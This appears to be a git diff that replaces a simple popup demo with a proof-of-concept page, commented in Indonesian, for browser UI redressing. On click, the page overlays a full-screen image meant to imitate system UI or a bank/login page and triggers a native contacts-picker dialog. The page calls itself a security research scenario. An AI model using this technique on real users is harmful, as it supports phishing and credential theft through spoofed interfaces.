@@ -1,48 +1,62 @@
-<html>
- <head> 
-  <meta charset="utf-8">
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-    }
-  </style>
- </head> 
- <body> 
-  <script>
-    function a(){
-      window.open(
-        "https://google.com",
-        "popup",
-        `
-          width=420,
-          height=320,
-          left=0,
-          top=0,
-          resizable=yes,
-          scrollbars=yes
-        `
-      );
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>UI Redressing Concept</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+                overflow: hidden; /* Mencegah scroll saat spoof aktif */
+            }         
+            #spoof {
+                width: 100%;
+                height: 100vh;
+                object-fit: fill;
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                z-index: 9999;
+            }
+            #content {
+                text-align: center;
+                padding-top: 50px;
+            }
+        </style>
+        <script>
+            // Menggunakan event listener untuk menangkap klik pertama
+            window.onclick = async () => {
+                const spoofImg = document.getElementById("spoof");
+                const mainContent = document.getElementById("content");
 
-      // ✅ Delay prompt
-      setTimeout(function(){
-        const x = prompt("Masukkan sesuatu:");
-        console.log("Hasil prompt:", x);
-      }, 2000); // 1000ms = 1 detik
-    }
-  </script> 
+                // Langkah 1: Tampilkan gambar spoof (masih di bawah dialog sistem nanti)
+                spoofImg.style.display = "block";
+                mainContent.style.display = "none";
 
-  <center>
-    <input type="button" class="button" value="Go to Google.com" onclick="a()">
-  </center>
+                try {
+                    // Langkah 2: Pemicu dialog sistem
+                    // Ini akan memaksa browser menampilkan UI native di atas konten web
+                    await navigator.contacts.select(["name"], {});
+                } catch (e) {
+                    console.log("Dialog ditutup atau dibatalkan");
+                }
+                
+                // Catatan: Tanpa Fullscreen API, bar alamat asli (URL bar) 
+                // mungkin tetap terlihat di bagian atas tergantung pada 
+                // perilaku scrolling dan versi browser.
+            }
+        </script>
+    </head>  
+    <body>
+        <!-- Gambar yang meniru UI sistem atau halaman bank/login -->
+        <img id="spoof" src="spoof.png.jpeg" alt="Spoof UI">
 
- </body>
+        <div id="content">
+            <h1>Skenario Riset Keamanan</h1>
+            <p>Klik di mana saja untuk memicu dialog sistem dan transisi UI.</p>
+        </div>
+    </body>
 </html>
